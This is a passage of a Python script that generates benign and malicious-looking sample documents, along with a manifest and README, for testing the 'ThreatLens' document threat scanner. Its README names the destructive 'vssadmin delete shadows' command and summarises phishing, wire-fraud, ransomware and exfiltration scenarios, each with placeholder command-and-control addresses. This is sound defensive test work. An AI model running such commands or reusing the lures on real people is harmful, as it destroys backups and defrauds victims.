        ["CC-103", "Corporate Identity & SSO", "Okta Identity Cloud", "28000.00", "27500.00", "-500.00", "Approved", "2026-Q3"],
        ["CC-104", "Enterprise Communication", "Slack Technologies / Salesforce", "16500.00", "16500.00", "0.00", "Approved", "2026-Q3"],
        ["CC-105", "External Compliance Audit", "Deloitte & Touche LLP", "65000.00", "65000.00", "0.00", "Approved", "2026-Q3"]
    ]
    with open(filepath, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerows(rows)
    print(f"[+] Generated CSV: {filepath.name}")

def generate_safe_remote_work_handbook_txt(filepath: Path):
    content = """GLOBAL ENTERPRISE IT & HR HANDBOOK — REMOTE WORK SECURITY PROTOCOL
=============================================================================
Document Reference: HR-IT-GUIDE-2026
Version: 4.1
Last Updated: October 2026
Governance: Corporate Security Policy & Annual Compliance Audit Guidelines
Standard: Certified under ISO/IEC 27001 Information Security Management

1. WELCOME & REMOTE WORK PHILOSOPHY
Enterprise embraces hybrid and flexible remote work while upholding our commitment
to data privacy, client trust, and infrastructure integrity under corporate security policy.
This guide details standard operating expectations for home office environments.

2. SECURE NETWORK ACCESS & VPN GUIDELINES
- Always connect to the corporate Virtual Private Network (VPN) using the pre-installed
  GlobalProtect client on your managed laptop.
- The standard corporate portal address is: https://vpn.internal.lan
- Your connection requires hardware FIDO2 key or approved authenticator push approval.
- Compliance audit standards mandate avoiding public Wi-Fi without active encryption.

3. WORKSTATION HARDENING & DEVICE HEALTH
- Corporate laptops are enrolled in automated patch management. Please allow scheduled
  operating system updates to complete during your maintenance window.
- Do not install unauthorized browser extensions or third-party file sharing tools.
- Lock your screen (Windows Key + L) whenever stepping away from your workspace.

4. IT HELP DESK SUPPORT & ASSISTANCE
If you experience hardware failures, display adapter issues, or password reset needs,
reach out to our friendly technical support team:
- Portal: https://helpdesk.internal.lan
- Email: it-support@internal.lan
- Internal Hotline: Ext. 4357 (HELP)
- Normal Support Hours: 24/7 Global Follow-the-Sun Coverage

Thank you for your daily dedication to keeping our company secure!
"""
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[+] Generated TXT: {filepath.name}")

def generate_safe_api_architecture_json(filepath: Path):
    content = {
        "openapi": "3.0.3",
        "info": {
            "title": "Enterprise Inventory Management REST API",
            "version": "2.4.0",
            "description": "Internal microservice API providing inventory query and stock reservation capabilities under corporate security policy and compliance audit approval.",
            "compliance": "ISO/IEC 27001 certified architecture standard",
            "contact": {
                "name": "Supply Chain Engineering Guild",
                "email": "inventory-guild@internal.lan",
                "url": "https://developer.internal.lan"
            }
        },
        "servers": [
            {"url": "https://inventory-api.internal.lan/v2", "description": "Production Internal Cluster"},
            {"url": "https://staging-inventory.internal.lan/v2", "description": "Staging Sandbox"}
        ],
        "paths": {
            "/items": {
                "get": {
                    "summary": "List available warehouse stock items",
                    "operationId": "listInventoryItems",
                    "parameters": [
                        {"name": "category", "in": "query", "schema": {"type": "string"}, "description": "Filter by item category"},
                        {"name": "limit", "in": "query", "schema": {"type": "integer", "default": 50}, "description": "Number of records"}
                    ],
                    "responses": {
                        "200": {"description": "Successful retrieval of stock records"}
                    }
                }
            },
            "/health": {
                "get": {
                    "summary": "Service readiness and liveness probe",
                    "operationId": "checkServiceHealth",
                    "responses": {
                        "200": {"description": "Service is healthy and connected to PostgreSQL database."}
                    }
                }
            }
        }
    }
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(content, f, indent=2)
    print(f"[+] Generated JSON: {filepath.name}")

# ============================================================================
# MASTER MANIFEST & DOCUMENTATION
# ============================================================================

def update_manifest():
    manifest = {
        "generated_at": "2026-10-16T13:30:00Z",
        "description": "ThreatLens Comprehensive Multi-Format Verification & Testing Suite (Safe vs Threat)",
        "documents": [
            # Original Safe Documents
            {
                "filename": "safe_company_policy.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Benign",
                "pages": 3,
                "file_type": "PDF",
                "description": "Corporate information security policy outlining employee responsibilities, password management, and incident response.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_project_report.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Benign",
                "pages": 3,
                "file_type": "PDF",
                "description": "Software engineering architecture report detailing microservices, database schemas, and performance benchmarks.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_security_awareness.pdf",
                "category": "Educational Security Documents",
                "intended_classification": "Safe / Context-Aware Educational",
                "pages": 3,
                "file_type": "PDF",
                "description": "Educational training material explaining phishing indicators and safe browsing without being classified as malicious.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_financial_report.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Benign",
                "pages": 3,
                "file_type": "PDF",
                "description": "Audited corporate financial statement with revenue metrics, operational expenditures, and auditor notes.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            # New Safe Documents
            {
                "filename": "safe_incident_response_playbook.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Operational Runbook",
                "pages": 3,
                "file_type": "PDF",
                "description": "NIST SP 800-61 Rev 2 standard operational procedure detailing incident handling, severity SLAs, and forensic chain of custody.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_cloud_infrastructure_guide.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Architecture Spec",
                "pages": 3,
                "file_type": "PDF",
                "description": "Enterprise cloud engineering design document detailing multi-region Kubernetes, Terraform IaC, and mTLS 1.3 Zero Trust architecture.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_devops_release_changelog.json",
                "category": "Safe Documents",
                "intended_classification": "Safe / Release Manifest",
                "pages": 1,
                "file_type": "JSON",
                "description": "Structured DevOps production deployment manifest with automated test pass rates, dependency upgrades, and telemetry endpoints.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_quarterly_budget_report.csv",
                "category": "Safe Documents",
                "intended_classification": "Safe / Financial Ledger",
                "pages": 1,
                "file_type": "CSV",
                "description": "Corporate IT operational expense ledger detailing approved SaaS subscriptions, vendor contracts, and cloud compute variance.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_remote_work_security_handbook.txt",
                "category": "Safe Documents",
                "intended_classification": "Safe / Policy Guide",
                "pages": 1,
                "file_type": "TXT",
                "description": "Employee IT onboarding handbook explaining corporate VPN usage, hardware security keys, and workstation patch guidelines.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_api_architecture_spec.json",
                "category": "Safe Documents",
                "intended_classification": "Safe / Technical Spec",
                "pages": 1,
                "file_type": "JSON",
                "description": "Standard OpenAPI 3.0 specification for internal microservice REST APIs, detailing schema contracts and health endpoints.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },

            # Original Threat Documents
            {
                "filename": "threat_phishing_email.pdf",
                "category": "Phishing & Credential Theft",
                "intended_classification": "Phishing",
                "pages": 3,
                "file_type": "PDF",
                "description": "Deceptive Microsoft 365 account suspension notice demanding urgent credential verification via spoofed domain.",
                "expected_severity": "High",
                "expected_indicators": 4
            },
            {
                "filename": "threat_credential_theft.pdf",
                "category": "Phishing & Credential Theft",
                "intended_classification": "Credential Theft",
                "pages": 3,
                "file_type": "PDF",
                "description": "Impersonation of internal IT administrator requesting domain password and MFA authenticator tokens.",
                "expected_severity": "High",
                "expected_indicators": 4
            },
            {
                "filename": "threat_suspicious_download.pdf",
                "category": "Ransomware & Malware",
                "intended_classification": "Malware",
                "pages": 3,
                "file_type": "PDF",
                "description": "Fake critical patch advisory instructing sysadmins to download executable and disable antivirus protections.",
                "expected_severity": "High",
                "expected_indicators": 4
            },
            {
                "filename": "threat_social_engineering.pdf",
                "category": "Social Engineering",
                "intended_classification": "Social Engineering",
                "pages": 3,
                "file_type": "PDF",
                "description": "Executive CEO impersonation message pressuring finance staff into an out-of-band urgent wire transfer.",
                "expected_severity": "High",
                "expected_indicators": 3
            },
            # New Threat Documents
            {
                "filename": "threat_ransomware_incident.pdf",
                "category": "Ransomware & Malware",
                "intended_classification": "Ransomware",
                "pages": 3,
                "file_type": "PDF",
                "description": "Critical LockBit 3.0 cyber incident advisory with volume shadow deletion commands, C2 beaconing IP 198.51.100.220, and ransom portal.",
                "expected_severity": "Critical",
                "expected_indicators": 6
            },
            {
                "filename": "threat_apt_spearphishing.pdf",
                "category": "Phishing & Credential Theft",
                "intended_classification": "Phishing / APT",
                "pages": 3,
                "file_type": "PDF",
                "description": "APT29 state-sponsored spearphishing campaign report with weaponized ISO, LNK dropper, Mimikatz memory injection, and C2 203.0.113.88.",
                "expected_severity": "High",
                "expected_indicators": 6
            },
            {
                "filename": "threat_log4shell_cve_alert.json",
                "category": "Vulnerability Exploitation",
                "intended_classification": "Vulnerability Exploitation",
                "pages": 1,
                "file_type": "JSON",
                "description": "Structured JSON advisory detailing CVE-2021-44228 Log4Shell JNDI injection exploits, malicious LDAP servers, and shell droppers.",
                "expected_severity": "Critical",
                "expected_indicators": 5
            },
            {
                "filename": "threat_exfiltration_covert_c2.txt",
                "category": "Data Exfiltration & C2",
                "intended_classification": "Data Exfiltration",
                "pages": 1,
                "file_type": "TXT",
                "description": "Digital forensics incident report detailing unauthorized 14.8 GB data exfiltration via DNS tunneling to 192.0.2.144 and Cobalt Strike hashes.",
                "expected_severity": "High",
                "expected_indicators": 5
            },
            {
                "filename": "threat_malicious_macro_invoice.csv",
                "category": "Ransomware & Malware",
                "intended_classification": "Malware / Dropper",
                "pages": 1,
                "file_type": "CSV",
                "description": "EDR process execution log capturing malicious Office macro spawning encoded PowerShell, payload download from bad domain, and C2 IP.",
                "expected_severity": "High",
                "expected_indicators": 5
            },
            {
                "filename": "threat_executive_wire_fraud.txt",
                "category": "Social Engineering",
                "intended_classification": "Social Engineering / BEC",
                "pages": 1,
                "file_type": "TXT",
                "description": "CEO impersonation Business Email Compromise (BEC) pressuring treasury director to bypass dual-approval and wire $485,000 urgently.",
                "expected_severity": "High",
                "expected_indicators": 3
            }
        ]
    }

    with open(SAMPLE_DIR / "test_manifest.json", "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)

    readme_content = """# ThreatLens Sample Documents Test & Verification Suite

This directory contains realistic test documents generated for testing, evaluating, and demonstrating the **ThreatLens** Document Scanning, Triage, and Threat Detection pipeline.

Documents cover both **Safe / Benign** and **Threat-Causing / Malicious** scenarios across multiple formats (**PDF, JSON, TXT, CSV**).

## Document Inventory

### Safe / Benign Documents (10 Files)
1. **`safe_company_policy.pdf`**: Enterprise information security governance covering ISO/IEC 27001, password complexity, FIDO2 MFA, and incident reporting. (*Safe / Benign*)
2. **`safe_project_report.pdf`**: Technical engineering milestone report detailing Kafka, FastAPI, and TimescaleDB microservice architectures. (*Safe / Benign*)
3. **`safe_security_awareness.pdf`**: Educational training module explaining phishing mechanics, safe link inspection, and reporting workflows. (*Safe / Context-Aware Educational*)
4. **`safe_financial_report.pdf`**: Audited annual corporate financial statement with revenue metrics, operational balance sheets, and audit notes. (*Safe / Benign*)
5. **`safe_incident_response_playbook.pdf`**: Enterprise NIST SP 800-61 Rev 2 incident handling standard operating procedures, severity SLAs, and forensic custody rules. (*Safe / Operational Runbook*)
6. **`safe_cloud_infrastructure_guide.pdf`**: Multi-region Kubernetes architecture blueprint, Terraform IaC modules, and mTLS 1.3 Zero Trust design. (*Safe / Architecture Spec*)
7. **`safe_devops_release_changelog.json`**: Structured microservice deployment manifest v3.2.1 with unit test pass rates, dependency upgrades, and benign internal telemetry URLs. (*Safe / Release Manifest*)
8. **`safe_quarterly_budget_report.csv`**: Corporate IT infrastructure ledger tracking approved SaaS subscriptions, vendor contracts, and compute variance. (*Safe / Financial Ledger*)
9. **`safe_remote_work_security_handbook.txt`**: Employee remote work guide detailing corporate VPN connections, hardware security keys, and patch policies. (*Safe / Policy Guide*)
10. **`safe_api_architecture_spec.json`**: OpenAPI 3.0 specification for internal inventory REST services with contract schemas and health checks. (*Safe / Technical Spec*)

### Threat-Causing / Suspicious Documents (10 Files)
11. **`threat_phishing_email.pdf`**: Urgent Microsoft 365 account suspension lure directing recipients to `login-verify-account[.]example[.]com`. (*High Severity Phishing*)
12. **`threat_credential_theft.pdf`**: IT administrator impersonation prompt requesting Active Directory passwords and MFA tokens via `sso-auth-reset[.]example[.]org`. (*High Severity Credential Theft*)
13. **`threat_suspicious_download.pdf`**: Deceptive zero-day patch advisory instructing recipients to download `security_patch_critical.exe` and disable antivirus. (*High Severity Malware*)
14. **`threat_social_engineering.pdf`**: CEO wire transfer BEC fraud demanding out-of-band wire authorization and strict secrecy. (*High Severity BEC*)
15. **`threat_ransomware_incident.pdf`**: Active LockBit 3.0 enterprise intrusion advisory with `vssadmin delete shadows` execution, C2 IP `198.51.100.220`, and ransom note. (*Critical Severity Ransomware*)
16. **`threat_apt_spearphishing.pdf`**: Targeted APT29 espionage campaign report featuring weaponized ISO, LNK dropper, Mimikatz credential dumping, and C2 `203.0.113.88`. (*High Severity APT Espionage*)
17. **`threat_log4shell_cve_alert.json`**: Structured CTI advisory for CVE-2021-44228 Log4Shell with JNDI LDAP lookup strings, target ports, and ELF dropper hashes. (*Critical Severity Vulnerability Exploitation*)
18. **`threat_exfiltration_covert_c2.txt`**: Digital forensics incident report detailing 14.8 GB exfiltration over DNS tunneling to `192.0.2.144` and Cobalt Strike beacon hashes. (*High Severity Data Exfiltration*)
19. **`threat_malicious_macro_invoice.csv`**: EDR process telemetry log capturing malicious Excel macro spawning encoded PowerShell, download from untrusted domain, and C2 IP. (*High Severity Malware Dropper*)
20. **`threat_executive_wire_fraud.txt`**: CEO impersonation prompt demanding urgent $485,000 wire transfer while explicitly mandating bypassing dual-authorization. (*High Severity Social Engineering*)

## Notes & RFC Compliance
All network indicators strictly adhere to standard documentation prefixes:
- IPv4: RFC 5737 documentation blocks (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`)
- Domains: RFC 2606 reserved domains (`example.com`, `example.org`)
"""
    with open(SAMPLE_DIR / "README.md", "w", encoding="utf-8") as f:
        f.write(readme_content)
    print("[+] Updated test_manifest.json and sample_documents/README.md")

def main():
    print("[*] Generating expanded ThreatLens sample documents (Threat-causing and Safe across PDF, JSON, TXT, CSV)...")
    
    # Generate new PDFs
    generate_threat_ransomware_incident(SAMPLE_DIR / "threat_ransomware_incident.pdf")
    generate_threat_apt_spearphishing(SAMPLE_DIR / "threat_apt_spearphishing.pdf")
    generate_safe_incident_response_playbook(SAMPLE_DIR / "safe_incident_response_playbook.pdf")
    generate_safe_cloud_infrastructure_guide(SAMPLE_DIR / "safe_cloud_infrastructure_guide.pdf")

    # Generate new JSONs
    generate_threat_log4shell_json(SAMPLE_DIR / "threat_log4shell_cve_alert.json")
    generate_safe_devops_release_json(SAMPLE_DIR / "safe_devops_release_changelog.json")
    generate_safe_api_architecture_json(SAMPLE_DIR / "safe_api_architecture_spec.json")

    # Generate new TXTs
    generate_threat_exfiltration_txt(SAMPLE_DIR / "threat_exfiltration_covert_c2.txt")
    generate_threat_executive_wire_fraud_txt(SAMPLE_DIR / "threat_executive_wire_fraud.txt")
    generate_safe_remote_work_handbook_txt(SAMPLE_DIR / "safe_remote_work_security_handbook.txt")

    # Generate new CSVs
    generate_threat_malicious_macro_csv(SAMPLE_DIR / "threat_malicious_macro_invoice.csv")
    generate_safe_quarterly_budget_csv(SAMPLE_DIR / "safe_quarterly_budget_report.csv")

    # Update manifest & documentation
    update_manifest()
    print("[+] All sample documents generated and cataloged successfully!")

if __name__ == "__main__":
    main()
